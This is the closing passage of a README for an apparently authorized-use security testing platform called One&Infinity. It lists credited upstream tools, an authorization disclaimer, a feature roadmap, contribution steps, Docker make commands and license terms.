| [APKTool](https://github.com/iBotPeaches/Apktool) | iBotPeaches | Apache 2.0 |
| [JADX](https://github.com/skylot/jadx) | skylot | Apache 2.0 |
| [Frida](https://frida.re) | Ole André V. Ravnås | wxWindows Library Licence |
| [Objection](https://github.com/sensepost/objection) | SensePost | Apache 2.0 |
| [Drozer](https://github.com/WithSecureLabs/drozer) | WithSecure | BSD |

### AI Security
| Tool | Author / Organization | License |
|---|---|---|
| [Garak](https://github.com/NVIDIA/garak) | NVIDIA | Apache 2.0 |
| [PyRIT](https://github.com/Azure/PyRIT) | Microsoft | MIT |
| [Giskard](https://github.com/Giskard-AI/giskard) | Giskard AI | Apache 2.0 |
| [ART](https://github.com/Trusted-AI/adversarial-robustness-toolbox) | IBM Trusted AI | MIT |

We respect the licenses of every upstream tool. One&Infinity does not bundle tool binaries — it invokes externally installed tools via subprocess or HTTP API. If you use this platform, please review and comply with the license terms of every tool you install.

---

## ⚠️ Disclaimer

**For authorized security testing only.**

One&Infinity is designed for:
- Bug bounty hunting on programs where you have explicit authorization
- Penetration testing engagements with written authorization from the system owner
- Security research on systems you own or have legal permission to test
- Educational and lab environments

**Using this platform against systems without explicit authorization is illegal** under the Computer Fraud and Abuse Act (US), the Computer Misuse Act (UK), and equivalent laws in most jurisdictions. The authors accept no responsibility for unauthorized or malicious use.

Scope enforcement is built in — but it relies on you configuring your scope correctly. Verify your targets before running autonomous modes.

---

## 📈 Roadmap

- [ ] **Nuclei template auto-generation** — generate custom templates from zero-day findings
- [ ] **LLM-driven triage** — local LLM (Ollama/llama.cpp) for autonomous finding severity assessment
- [x] **Distributed agent cluster** — Redis-backed master-worker swarm with horizontally-scalable workers (shipped in v1.2.0)
- [ ] **CI/CD integration** — native GitHub Actions / GitLab CI pipeline templates with finding gating
- [ ] **GraphQL introspection attack engine** — automated schema extraction + BOLA/auth testing
- [ ] **iOS static analysis** — IPA decompilation and Frida-based iOS dynamic analysis parity with Android
- [ ] **Nuclei v3 custom flow support** — conditional multi-step template execution
- [ ] **Passive traffic integration** — mitmproxy plugin for always-on passive scanning during manual testing

---

## 🤝 Contributing

Contributions are welcome for:
- New exploit chain patterns (add to `exploit_chains/chain_patterns.py`)
- Additional validation methods in `finding_validation_engine.py`
- New tool wrappers in `modules/tool_wrappers.py`
- Plugin contributions in `plugins/recon/` or `plugins/vuln/`

```bash
# Standard flow
git checkout -b feature/your-feature
# Make changes, add tests in tests/
python3 -m unittest discover -s tests -p "test_*.py"
python3 oneinfinity.py doctor   # must pass at 10.0/10.0
git push origin feature/your-feature
# Open a pull request
```

**Before submitting:** every PR must pass the full test suite (34+ tests, `python3 -m unittest`) and the doctor health check (`10.0/10.0`).

---

## 🐳 Docker Quick Reference

| Task | Command |
|---|---|
| First-time setup | `make setup` |
| Build images | `make build` |
| Start full stack | `make up` |
| Start minimal (no monitoring) | `make up-min` |
| Submit full scan | `make scan T=example.com` |
| Recon only | `make recon T=example.com` |
| Scale recon workers | `make scale-recon N=4` |
| Check worker health | `make workers-status` |
| View queue depths | `make queue-status` |
| Tail all logs | `make logs` |
| Open orchestrator shell | `make shell` |
| Stop everything | `make down` |
| Remove all scan data | `make purge` |

Image variants: `latest` (core), `latest-ai` (with AI/ML dependencies).
Full reference: [DOCKER.md](DOCKER.md)

---

## 📜 License

MIT License — see [LICENSE](LICENSE) for details.

This license covers only the One&Infinity source code. Integrated tools retain their own licenses. When you install and use external tools, you are bound by their respective licenses.

---

<p align="center">
  <b>One&Infinity doesn't just find vulnerabilities.</b><br>
  <b>It understands why they're reachable, how they chain, and what they're worth.</b>
</p>

<p align="center">
  <i>Built for researchers who think in attack paths, not finding counts.</i>
</p>
